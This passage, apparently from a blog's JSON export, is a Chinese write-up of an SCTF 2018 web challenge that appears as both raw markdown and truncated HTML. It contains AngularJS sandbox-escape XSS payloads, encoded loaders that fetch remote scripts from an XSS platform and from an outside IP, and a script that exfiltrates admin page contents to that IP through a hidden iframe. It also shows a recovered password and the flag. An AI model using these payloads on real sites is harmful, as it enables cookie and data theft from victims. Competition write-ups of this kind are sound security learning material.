jBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D\n   ```\n\n   解码后:\n\n   ```\n   <!DOCTYPE html>\n   <html lang=\"zh-CN\">\n     <head>\n       <meta charset=\"utf-8\">\n       <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n       <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n       <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->\n       <meta name=\"description\" content=\"\">\n       <meta name=\"author\" content=\"\">\n       <link rel=\"icon\" href=\"\">\n   \n       <title>SYC</title>\n   \n   \n       <link href=\"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\">\n       <link href=\"css/ie10-viewport-bug-workaround.css\" rel=\"stylesheet\">\n       <link href=\"css/starter-template.css\" rel=\"stylesheet\">\n       <style type=\"text/css\">\n             body {\n               padding-top: 60px;\n               padding-bottom: 40px;\n             }\n           </style>\n   \n       <script src=\"https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js\"></script>\n       <script src=\"https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js\"></script>\n       <script src=\"js/ie-emulation-modes-warning.js\"></script>\n   \n     </head>\n   \n     <body >\n   \n       <nav class=\"navbar navbar-inverse navbar-fixed-top\">\n         <div class=\"container\">\n           <div class=\"navbar-header\">\n             <button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n               <span class=\"sr-only\">Toggle navigation</span>\n               <span class=\"icon-bar\"></span>\n               <span class=\"icon-bar\"></span>\n               <span class=\"icon-bar\"></span>\n             </button>\n             <a class=\"navbar-brand\" href=\"/\">SYC ADMIN</a>\n           </div>\n           <div id=\"navbar\" class=\"collapse navbar-collapse\">\n             <ul class=\"nav navbar-nav\">\n               <li class=\"active\"><a href=\"#\">Home</a></li>\n               <li><a href=\"#\">日志</a></li>\n               <li><a href=\"#\">账单</a></li>\n               <li><a href=\"admin/file\">文件</a></li>\n               <li><a href=\"admin/suggest\">留言</a></li>\n               <li><a href=\"#\">发布</a></li>\n             </ul>\n           </div>\n         </div>\n       </nav>\n   \n   \n   <div class=\"container\">\n     <div class=\"jumbotron\">\n           <h1>HELLO adminClound</h1>\n           <p>新版后台2.0!</p>\n     </div>\n   </div>\n   \n   \n       <!-- Bootstrap core JavaScript\n   ================================================== -->\n   <!-- Placed at the end of the document so the pages load faster -->\n   <script src=\"https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js\"></script>\n   <script src=\"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n   <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->\n   <script src=\"js/ie10-viewport-bug-workaround.js\"></script>\n   \n   </body>\n   </html>\n   ```\n\n9. 获取`admin/file`，需要登录\n\n   ```\n   <div class=\"container\">\n     <form method=\"post\">\n       <label for=\"filePasswd\" class=\"sr-only\">输入文件密码</label>\n       <input type=\"text\" id=\"filePasswd\" class=\"form-control\" placeholder=\"filepasswd\" required=\"\" autofocus=\"\" name=\"filepasswd\">\n       <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n     </form>\n   </div>\n   ```\n\n10. 我们发现新的用户\n\n  ```\n  adminClound\n  ```\n\n  结合路由:\n\n  ```\n  http://116.62.137.114:4879/api/memos/admintest2313\n  ```\n\n  访问`http://116.62.137.114:4879/api/memos/adminClound`\n\n  得到`adminClound`的密码:`HGf^&39NsslUIf^23`\n\n11. 登录`admin/file`\n\n    paylaod如下：\n\n    ```\n    $.ajax({\n        url: \"/admin/file\",\n        type: \"POST\",\n        data: \"filepasswd=HGf%5E%2639NsslUIf%5E23\",\n        dataType: \"text\",\n        success: function(result) {\n            var code = btoa(encodeURIComponent(result));\n            xssPost('http://123.207.90.143', code);\n        },\n        error: function(msg) {\n    \n        }\n    })\n    \n    function xssPost(url, postStr) {\n        var de;\n        de = document.body.appendChild(document.createElement('iframe'));\n        de.src = 'about:blank';\n        de.height = 1;\n        de.width = 1;\n        de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n        de.contentDocument.forms[0].submit();\n        de.style.display = 'none';\n    }\n    \n    ```\n\n    得到flag:`sctf{T4is_is_f1ag2313}`。","slug":"sctf2018","published":1,"updated":"2018-06-25T07:37:03.991Z","_id":"cjity3jqa001gly4j9ps8b2jk","comments":1,"layout":"post","photos":[],"link":"","content":"<a id=\"more\"></a>\n<h1 id=\"新的建议板\"><a href=\"#新的建议板\" class=\"headerlink\" title=\"新的建议板\"></a>新的建议板</h1><ol>\n<li><p>基础payload</p>\n<pre><code class=\"js\">{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(alert(1))//');}}\n</code></pre>\n</li>\n<li><p>打cookie</p>\n<pre><code class=\"js\">{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//');}}\n</code></pre>\n</li>\n<li><p>调用script</p>\n<p>使用</p>\n<blockquote>\n<p>$.getScript(‘<a href=\"https://xsspt.com/HMTzMS\" target=\"_blank\" rel=\"noopener\">https://xsspt.com/HMTzMS</a>‘)</p>\n<p>base64一下: <code>JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==</code></p>\n</blockquote>\n</li>\n<li><p>这样就可以拿到cookie</p>\n<p>接收到的内容如下:</p>\n<pre><code>location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1%7D%20%7D%20%7D;eval(atob(%5C&#39;JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C&#39;))//&#39;);%7D%7D\n</code></pre></li>\n<li><p>cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。</p>\n</li>\n<li><p>获取<code>/admin</code>的内容</p>\n<pre><code>JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\n=&gt;\n$.getScript(&#39;http://123.207.90.143/su.js&#39;)\n</code></pre><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\'))//');}}\n</code></pre></li>\n<li><p>su.js内容即paylaod如下：</p>\n<pre><code>$.ajax({\n    url: &quot;/admin&quot;,\n    type: &quot;GET&quot;,\n    dataType: &quot;text&quot;,\n    success: function(result) {\n        var code = btoa(encodeURIComponent(result));\n        xssPost(&#39;http://123.207.90.143&#39;, code);\n    },\n    error: function(msg) {\n\n    }\n})\n\nfunction xssPost(url, postStr) {\n    var de;\n    de = document.body.appendChild(document.createElement(&#39;iframe&#39;));\n    de.src = &#39;about:blank&#39;;\n    de.height = 1;\n    de.width = 1;\n    de.contentDocument.write(&#39;&lt;form method=&quot;GET&quot; action=&quot;&#39; + url + &#39;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&#39; + postStr + &#39;&quot;/&gt;&lt;/form&gt;&#39;);\n    de.contentDocument.forms[0].submit();\n    de.style.display = &#39;none&#39;;\n}\n</code></pre></li>\n<li><p>admin内容如下:</p>\n<pre><code>JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D\n</code></pre><p>解码后:</p>\n<p>```<br>&lt;!DOCTYPE html&gt;<br><html lang=\"zh-CN\"><br>  <head></head></html></p>\n<pre><code>&lt;meta charset=&quot;utf-8&quot;&gt;\n&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;\n&lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;\n&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;\n&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;\n&lt;link rel=&quot;icon&quot; href=&quot;&quot;&gt;\n\n&lt;title&gt;SYC&lt;/title&gt;\n</code></pre></li>\n</ol>\n<pre><code>   &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\n   &lt;link href=&quot;css/ie10-viewport-bug-workaround.css&quot; rel=&quot;stylesheet&quot;&gt;\n   &lt;link href=&quot;css/starter-template.css&quot; rel=&quot;stylesheet&quot;&gt;\n   &lt;style type=&quot;text/css&quot;&gt;\n         body {\n           padding-top: 60px;\n           padding-bottom: 40px;\n         }\n       &lt;/style&gt;\n\n   &lt;script src=&quot;https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;\n   &lt;script src=&quot;https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js&quot;&gt;&lt;/script&gt;\n   &lt;script src=&quot;js/ie-emulation-modes-warning.js&quot;&gt;&lt;/script&gt;\n\n &lt;/head&gt;\n\n &lt;body &gt;\n\n   &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;\n     &lt;div class=&quot;container&quot;&gt;\n       &lt;div class=&quot;navbar-header&quot;&gt;\n         &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;\n           &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;\n           &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;\n           &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;\n           &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;\n         &lt;/button&gt;\n         &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;SYC ADMIN&lt;/a&gt;\n       &lt;/div&gt;\n       &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;\n         &lt;ul class=&quot;nav navbar-nav&quot;&gt;\n           &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;#&quot;&gt;日志&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;#&quot;&gt;账单&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;admin/file&quot;&gt;文件&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;admin/suggest&quot;&gt;留言&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;#&quot;&gt;发布&lt;/a&gt;&lt;/li&gt;\n         &lt;/ul&gt;\n       &lt;/div&gt;\n     &lt;/div&gt;\n   &lt;/nav&gt;\n</code></pre>   <div class=\"container\"><br>     <div class=\"jumbotron\"><br>           <h1>HELLO adminClound</h1><br>           